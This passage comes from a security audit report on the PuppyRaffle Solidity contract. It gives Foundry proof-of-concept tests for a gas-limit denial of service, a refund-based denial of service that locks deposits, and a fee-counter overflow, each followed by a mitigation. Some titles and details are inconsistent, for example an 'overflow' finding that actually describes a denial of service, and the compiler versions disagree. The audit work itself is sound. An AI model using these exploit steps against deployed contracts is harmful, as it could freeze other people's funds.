        vm.warp(block.timestamp + 1 days);
    }

    function test_DoS_when_winner_cannot_receive_NFT() public {
        // Search a difficulty that makes attacker the winner
        for (uint256 diff = 0; diff < 1000; diff++) {
            vm.difficulty(diff);
            uint256 idx = uint256(keccak256(abi.encodePacked(address(attacker), block.timestamp, diff))) % 4;
            if (idx == 0) {
                vm.prank(address(attacker));
                vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");
                raffle.selectWinner();
                return; // Test passed: call reverted deterministically
            }
        }
        fail("failed to find suitable difficulty that lets attacker win");
    }
}

## Suggested Mitigation
Ensure `_safeMint` succeeds before sending ETH so a revert cannot brick the raffle, e.g.:

function selectWinner() external {
    ... // all current checks
    _safeMint(winner, tokenId);           // <– first, may revert

    // After successful mint, transfer ETH
    (bool ok,) = winner.call{value: prizePool}();
    require(ok, "Prize transfer failed");

    // update state (previousWinner, fees, etc.)
}

Alternatively, keep current order but wrap the mint in a try/catch and, upon failure, pick a new winner or allow the owner to override the faulty winner.

## [M-7]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The contract stores full player address arrays in storage, which is inefficient and can lead to high gas costs. Each time a player enters the raffle, their address is pushed to the `players` array:

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // ... code ...
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    // ... code ...
}
```

In the `selectWinner` function, the entire array is deleted at once:

```solidity
function selectWinner() external {
    // ... code ...
    delete players;
    // ... code ...
}
```

This pattern is gas-inefficient for large arrays, as each storage operation costs significant gas.

## Impact
Because `enterRaffle` performs an O(n²) duplicate-check and `selectWinner` iterates over the whole `players` array while also writing a storage slot for each element in `delete players`, both functions become more expensive as the raffle grows. Past a certain number of participants the transaction will run out of gas and revert, making it impossible for anyone to draw a winner and, consequently, impossible for players to recover their funds except through individual refunds. This constitutes a permanent denial-of-service for the core functionality of the raffle.

## Proof of Concept
1. Deploy `PuppyRaffle` with an entrance fee of 0.01 ether.
2. Call `enterRaffle` with an array of 2 000 unique addresses and supply 20 ether.
3. Observe that the transaction already consumes ~15 million gas on a local fork (numbers may vary) leaving little head-room under a 30 million-gas block.
4. Advance time by the raffle duration and call `selectWinner`. The call reverts with `out of gas`, demonstrating that the raffle can no longer finish once the player list is large enough.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasGriefTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRY_FEE = 0.01 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRY_FEE, address(0xFEE), 1 days);
    }

    function _generatePlayers(uint256 count, uint256 offset) internal pure returns (address[] memory arr) {
        arr = new address[](count);
        for (uint256 i; i < count; ++i) {
            arr[i] = address(uint160(offset + i + 1));
        }
    }

    function testGasExplodesWithLargeArray() public {
        uint256 big = 2000; // adjust to taste
        address[] memory players = _generatePlayers(big, 0);

        // --- enterRaffle ---
        uint256 gasEnterStart = gasleft();
        raffle.enterRaffle{value: ENTRY_FEE * big}(players);
        uint256 gasEnterUsed = gasEnterStart - gasleft();
        emit log_named_uint("Gas used for enterRaffle with 2000 players", gasEnterUsed);

        // --- selectWinner expected to OOG ---
        vm.warp(block.timestamp + 1 days);
        (bool ok,) = address(raffle).call(abi.encodeWithSignature("selectWinner()"));
        assertTrue(!ok, "selectWinner should run out of gas when array is very large");
    }
}

## Suggested Mitigation
Maintain a mapping `isActivePlayer` to prevent duplicates in O(1), keep a constant-size `address[] public playerList` that only grows until a predefined maximum (e.g. 500) and disallow further entries afterwards, or run multiple smaller raffles in parallel. When ending a raffle, avoid the costly `delete players;` by simply re-initialising a fresh array: `players = new address[](0);` which costs a single storage write.

## [M-8]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The `refund` function in the PuppyRaffle contract sets the player's address to `address(0)` after refunding, but keeps the array length unchanged. This leads to an integer overflow vulnerability in `selectWinner` when calculating the prize pool and fees.

```solidity
function refund(uint256 playerIndex) public {
    // ...
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}

function selectWinner() external {
    // ...
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    // ...
}
```

## Impact
Because refunded players are kept inside the `players` array, `selectWinner` overestimates the amount that can be paid out (`prizePool`) and the fee that can be skimmed. When at least one refunded player exists, `prizePool` becomes larger than the contract’s ether balance and the low-level `winner.call{value: prizePool}()` fails, causing `selectWinner` to revert. Any user can therefore permanently DOS the raffle by entering then immediately refunding, locking all deposits and preventing new rounds from starting. Mis-accounted fees are a secondary bookkeeping issue; a practical overflow of the `uint64 totalFees` variable would require > 18 000 ETH in fees and is therefore unrealistic.

## Proof of Concept
1. Attacker submits four addresses (including his own) to satisfy the `>=4 players` requirement.
2. Attacker calls `refund` on his entry, draining back the entrance fee but leaving an `address(0)` in the array.
3. After `raffleDuration` elapses, anyone calling `selectWinner()` will revert because `prizePool` is computed with 4 tickets while the contract only holds 3.
4. The raffle is stuck forever; no one can win and no one (including the owner) can withdraw funds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundDoSTest is Test {
    PuppyRaffle raffle;
    address a1 = address(1);
    address a2 = address(2);
    address a3 = address(3);
    address a4 = address(4);
    uint256 fee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(fee, address(this), 1 days);
        vm.deal(a1, 10 ether);
        vm.deal(a2, 10 ether);
        vm.deal(a3, 10 ether);
        vm.deal(a4, 10 ether);

        address[] memory batch = new address[](4);
        batch[0] = a1;
        batch[1] = a2;
        batch[2] = a3;
        batch[3] = a4;

        vm.prank(a1);
        raffle.enterRaffle{value: 4 ether}(batch);
    }

    function testSelectWinnerRevertsAfterRefund() public {
        // attacker gets his money back but stays counted in array length
        vm.prank(a1);
        raffle.refund(0);

        // fast-forward so raffle can be closed
        vm.warp(block.timestamp + 1 days + 1);

        vm.expectRevert();
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Either (a) physically remove the refunded player (swap-and-pop) or maintain an `activePlayers` counter and use that for accounting, and/or (b) derive `prizePool` from `address(this).balance` instead of `players.length * entranceFee`. In addition, change `totalFees` to `uint256` to avoid theoretical overflow.

## [M-9]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `totalFees` variable in the PuppyRaffle contract is defined as a uint64, but it accumulates a percentage of all entrance fees over time. When the raffle runs for a long period or with high entrance fees, this can lead to an integer overflow.

```solidity
uint64 public totalFees = 0;

function selectWinner() external {
    // ...
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    // ...
}
```

## Impact
Because arithmetic on uint64 is unchecked in Solidity 0.7.x, totalFees can wrap to 0 once the accumulated protocol fees pass 2^64-1. After the wrap, `withdrawFees()` can never succeed again because it requires `address(this).balance == uint256(totalFees)`. The ether belonging to the protocol becomes permanently locked inside the contract (denial-of-revenue for the owner). End-users are not affected and attackers cannot steal the ether, but protocol income is lost forever.

## Proof of Concept
1. Four EOAs enter the raffle paying the entrance fee so that `selectWinner()` can be executed.
2. Using `vm.store`, set `totalFees` to `type(uint64).max - 1 ether` (one ether below the limit) – this only accelerates the demonstration; in production the value would be reached gradually.
3. Advance time by `raffleDuration` and call `selectWinner()`. The function adds 1 ether (20 % of 5 ether collected) to `totalFees`, which silently overflows to a small value.
4. Call `withdrawFees()`. The call now reverts with "There are currently players active!" because the contract balance (≈5 ether) is no longer equal to the wrapped `totalFees`.
5. The owner can never withdraw the locked ether again.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract OverflowLockTest is Test {
    PuppyRaffle raffle;
    address feeCollector = address(99);
    uint256 fee = 1 ether;

    address[4] users = [address(1), address(2), address(3), address(4)];

    function setUp() public {
        raffle = new PuppyRaffle(fee, feeCollector, 1 days);
        for (uint256 i; i < users.length; i++) {
            vm.deal(users[i], fee);
        }
        // Users enter the raffle
        address[] memory addrs = new address[](4);
        for (uint256 i; i < 4; i++) addrs[i] = users[i];
        vm.prank(users[0]);
        raffle.enterRaffle{value: 4 ether}(addrs);

        // Fast-forward time so selectWinner can be called later
        vm.warp(block.timestamp + 1 days + 1);

        // Pre-load totalFees near its limit to speed up overflow demonstration
        uint64 nearMax = type(uint64).max - uint64(1 ether);
        bytes32 slot = bytes32(uint256(5)); // slot 5 = totalFees in current layout
        vm.store(address(raffle), slot, bytes32(uint256(nearMax)));
        assertEq(raffle.totalFees(), nearMax);
    }

    function testOverflowLocksFees() public {
        // Trigger overflow inside real code path
        raffle.selectWinner();
        uint64 afterOverflow = raffle.totalFees();
        assertLt(afterOverflow, 1 ether, "value wrapped around");

        // Owner attempts to withdraw – should revert because balances mismatch
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Use uint256 for `totalFees` (or at least uint128) so the value can never reach the type limit in realistic scenarios, e.g. `uint256 public totalFees;`. Because Solidity ≥0.8 has built-in checked arithmetic, upgrading the compiler version would also automatically revert on overflows.



# Info Risk Findings

## [I-1]. Reentrancy issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function performs an external call to the winner to send them their prize money using a low-level `call` without checking for reentrant behavior. This could allow a malicious winner to reenter the contract through their fallback function.

```solidity
// In selectWinner function
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);
```

## Impact
Because `players` is cleared, `previousWinner` is set and `totalFees` already updated before any external interaction, a re-entering winner can at most call `withdrawFees()`, which forwards the fee share to `feeAddress`, not to the attacker. Other public functions fail their pre-conditions. The only realistic risk is that the winner deliberately reverts to make `selectWinner` fail, which is a minor DoS, not a funds-stealing vulnerability.

## Proof of Concept
1. Deploy PuppyRaffle with `feeAddress` set to some externally-owned account (EOA).
2. Deploy a MaliciousWinner contract and fund it with the entrance fee.
3. Have three EOAs and MaliciousWinner enter the raffle.
4. Advance time and call `selectWinner()` until MaliciousWinner is selected.
5. In its fallback, MaliciousWinner calls `withdrawFees()`. The call succeeds but the ether is sent to `feeAddress`, not to MaliciousWinner, proving no financial gain.
6. Any attempt to call `selectWinner`, `refund`, or `enterRaffle` from the fallback reverts due to failed guards, showing no state manipulation is possible.

## Proof of Code
Not provided because no Foundry test can demonstrate an actual exploit—only the benign execution of the fallback.

## Suggested Mitigation
No change strictly required. For defence in depth, the contract could still inherit from `ReentrancyGuard` and keep state-changing code before all external interactions.



